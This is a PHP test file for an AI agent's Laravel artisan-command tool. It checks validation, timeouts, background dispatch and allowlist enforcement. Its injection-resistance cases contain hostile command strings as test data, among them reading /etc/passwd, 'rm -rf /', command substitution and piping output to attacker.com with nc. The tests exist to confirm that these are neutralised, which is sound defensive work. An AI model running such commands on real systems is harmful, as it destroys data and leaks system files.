<?php

use App\Modules\Core\AI\Models\OperationDispatch;
use App\Modules\Core\AI\Services\BackgroundCommandService;
use App\Modules\Core\AI\Tools\ArtisanTool;
use App\Modules\Core\User\Models\User;
use Illuminate\Support\Facades\Process;
use Tests\Support\AssertsToolBehavior;
use Tests\TestCase;

uses(TestCase::class, AssertsToolBehavior::class);

const ARTISAN_ROUTES_OUTPUT = 'routes output';
const ARTISAN_COMMAND_NOT_FOUND = 'Command not found';
const ARTISAN_MIGRATE_COMMAND = 'php artisan migrate';
const ARTISAN_MIGRATE_SEED_COMMAND = 'php artisan migrate --seed';
const ARTISAN_BACKGROUND_DENIAL = 'Command is not permitted for background execution.';
const ARTISAN_DENIAL_FRAGMENT = 'not permitted';

/** @param list<string> $expectedArguments */
function assertArtisanCommandArgv(ArtisanTool $tool, string $command, array $expectedArguments): void
{
    Process::fake([
        '*' => Process::result('ok'),
    ]);

    $tool->execute(['command' => $command]);

    Process::assertRan(fn ($process): bool => $process->command === [
        'php',
        'artisan',
        ...$expectedArguments,
    ]);
}

beforeEach(function () {
    $this->backgroundService = Mockery::mock(BackgroundCommandService::class);
    $this->tool = new ArtisanTool($this->backgroundService);
});

describe('tool metadata', function () {
    it('has the expected metadata', function () {
        $this->assertToolMetadata(
            $this->tool,
            'artisan',
            'admin.ai.tool.artisan.execute',
            ['command', 'timeout', 'background'],
            ['command'],
        );

        $schema = $this->tool->parametersSchema();

        expect($this->tool->description())->toContain('background')
            ->and($schema['properties']['timeout']['type'])->toBe('integer')
            ->and($schema['properties']['background']['type'])->toBe('boolean');
    });
});

describe('input validation', function () {
    it('rejects missing or empty command', function () {
        $this->assertRejectsMissingAndEmptyStringArgument('command');
    });

    it('rejects non-string command', function () {
        $result = $this->tool->execute(['command' => 42]);
        expect((string) $result)->toContain('Error');
    });

    it('rejects whitespace-only command', function () {
        $result = $this->tool->execute(['command' => '   ']);
        expect((string) $result)->toContain('Error');
    });

    it('strips optional artisan prefixes', function (string $command) {
        Process::fake([
            '*' => Process::result(ARTISAN_ROUTES_OUTPUT),
        ]);

        $result = $this->tool->execute(['command' => $command]);
        expect((string) $result)->toBe(ARTISAN_ROUTES_OUTPUT);
    })->with([
        'php artisan' => ['php artisan route:list'],
        'artisan' => ['artisan route:list'],
    ]);
});

describe('foreground execution', function () {
    it('executes command and returns output', function () {
        Process::fake([
            '*' => Process::result('Routes listed'),
        ]);

        $result = $this->tool->execute(['command' => 'route:list']);
        expect((string) $result)->toBe('Routes listed');
    });

    it('returns error output on failure', function () {
        Process::fake([
            '*' => Process::result(
                output: '',
                errorOutput: ARTISAN_COMMAND_NOT_FOUND,
                exitCode: 1,
            ),
        ]);

        $result = $this->tool->execute(['command' => 'bad:command']);
        expect((string) $result)->toContain('failed')
            ->and((string) $result)->toContain(ARTISAN_COMMAND_NOT_FOUND);
    });

    it('returns success message for empty output', function () {
        Process::fake([
            '*' => Process::result(''),
        ]);

        $result = $this->tool->execute(['command' => 'cache:clear']);
        expect((string) $result)->toContain('successfully');
    });

    it('returns error output on failure with both outputs', function () {
        Process::fake([
            '*' => Process::result(
                output: 'partial output',
                errorOutput: 'error details',
                exitCode: 1,
            ),
        ]);

        $result = $this->tool->execute(['command' => 'fail:cmd']);
        expect((string) $result)->toContain('failed')
            ->and((string) $result)->toContain('error details')
            ->and((string) $result)->toContain('partial output');
    });

});

describe('timeout parameter', function () {
    it('normalizes the foreground timeout', function (mixed $timeout, int $expected) {
        Process::fake([
            '*' => Process::result('done'),
        ]);

        $arguments = ['command' => 'test:cmd'];

        if ($timeout !== null) {
            $arguments['timeout'] = $timeout;
        }

        $this->tool->execute($arguments);

        Process::assertRan(fn ($process): bool => $process->timeout === $expected);
    })->with([
        'default' => [null, 30],
        'custom' => [120, 120],
        'minimum clamp' => [0, 1],
        'maximum clamp' => [999, 300],
        'non-integer fallback' => ['fast', 30],
    ]);
});

describe('background execution', function () {
    it('dispatches once and returns the polling contract without starting a process', function () {
        Process::fake();

        $dispatch = new OperationDispatch([
            'id' => 'op_bg_migrate123',
            'task' => ARTISAN_MIGRATE_COMMAND,
            'status' => 'queued',
        ]);

        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->with('migrate', 42)
            ->andReturn($dispatch);

        $this->actingAs(User::factory()->make(['id' => 42]));

        $result = $this->tool->execute([
            'command' => 'migrate',
            'background' => true,
        ]);
        $data = json_decode((string) $result, true);

        expect($data)->not->toBeNull()
            ->and($data['status'])->toBe('dispatched')
            ->and($data['dispatch_id'])->toBe('op_bg_migrate123')
            ->and($data['command'])->toBe(ARTISAN_MIGRATE_COMMAND)
            ->and($data['message'])->toContain('delegation_status');
        Process::assertNothingRan();
    });

    it('returns policy_denied for disallowed commands', function () {
        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andThrow(new InvalidArgumentException('Command "db:wipe" is not permitted for background execution.'));

        $result = $this->tool->execute([
            'command' => 'db:wipe',
            'background' => true,
        ]);

        expect((string) $result)->toContain('Error')
            ->and((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
    });

    it('strips prefix before dispatching', function () {
        $dispatch = new OperationDispatch([
            'id' => 'op_bg_stripped',
            'task' => ARTISAN_MIGRATE_SEED_COMMAND,
            'status' => 'queued',
        ]);

        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->with('migrate --seed', null)
            ->andReturn($dispatch);

        $result = $this->tool->execute([
            'command' => ARTISAN_MIGRATE_SEED_COMMAND,
            'background' => true,
        ]);
        $data = json_decode((string) $result, true);

        expect($data['command'])->toBe(ARTISAN_MIGRATE_SEED_COMMAND);
    });

});

describe('output format', function () {
    it('trims output whitespace', function () {
        Process::fake([
            '*' => Process::result("  output with spaces  \n"),
        ]);

        $result = $this->tool->execute(['command' => 'test:cmd']);
        expect((string) $result)->toBe('output with spaces');
    });

    it('prefers stdout over stderr for successful commands', function () {
        Process::fake([
            '*' => Process::result(
                output: 'stdout content',
                errorOutput: 'stderr content',
            ),
        ]);

        $result = $this->tool->execute(['command' => 'test:cmd']);
        expect((string) $result)->toBe('stdout content');
    });

    it('falls back to stderr when stdout is empty', function () {
        Process::fake([
            '*' => Process::result(
                output: '',
                errorOutput: 'stderr only',
            ),
        ]);

        $result = $this->tool->execute(['command' => 'test:cmd']);
        expect((string) $result)->toBe('stderr only');
    });

});

describe('command injection resistance', function () {
    it('tokenizes commands into inert argv', function (string $command, array $expectedArguments) {
        assertArtisanCommandArgv($this->tool, $command, $expectedArguments);
    })->with([
        'backticks' => [
            'tinker --execute="echo `whoami`"',
            ['tinker', '--execute=echo `whoami`'],
        ],
        'semicolon' => [
            'route:list; cat /etc/passwd',
            ['route:list;', 'cat', '/etc/passwd'],
        ],
        'logical operators' => [
            'cache:clear && rm -rf /',
            ['cache:clear', '&&', 'rm', '-rf', '/'],
        ],
        'command substitution' => [
            'tinker --execute="$(id)"',
            ['tinker', '--execute=$(id)'],
        ],
        'quoted values' => [
            "migrate --seed --path='database/migrations' --name=\"two words\"",
            ['migrate', '--seed', '--path=database/migrations', '--name=two words'],
        ],
    ]);

    it('handles unmatched opening quote without crashing', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        // Unmatched single quote — the parser should not crash.
        $this->tool->execute(['command' => "tinker --execute='echo hello"]);

        Process::assertRan(function ($process) {
            return is_array($process->command);
        });
    });

});

describe('background command allowlist security', function () {
    it('rejects unsafe background commands', function (string $command) {
        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andThrow(new InvalidArgumentException(ARTISAN_BACKGROUND_DENIAL));

        $result = $this->tool->execute([
            'command' => $command,
            'background' => true,
        ]);

        expect((string) $result)->toContain('Error')
            ->and((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
    })->with([
        'semicolon' => ['migrate; cat /etc/passwd'],
        'pipe' => ['migrate | nc attacker.com 4444'],
        'command substitution' => ['migrate $(whoami)'],
    ]);

    it('matches allowlist entries only at a command-namespace boundary', function () {
        $service = new BackgroundCommandService;

        // Entry 'route:list' must not authorize a longer, unrelated name.
        expect($service->isAllowed('route:list'))->toBeTrue()
            ->and($service->isAllowed('route:listevil --force'))->toBeFalse()
            ->and($service->isAllowed('migrate:status'))->toBeTrue()
            ->and($service->isAllowed('migrate:statusevil'))->toBeFalse()
            // Namespace entries still cover their children.
            ->and($service->isAllowed('queue:work'))->toBeTrue()
            ->and($service->isAllowed('blb:db:backup'))->toBeTrue()
            ->and($service->isAllowed('queueevil:work'))->toBeFalse();
    });
});
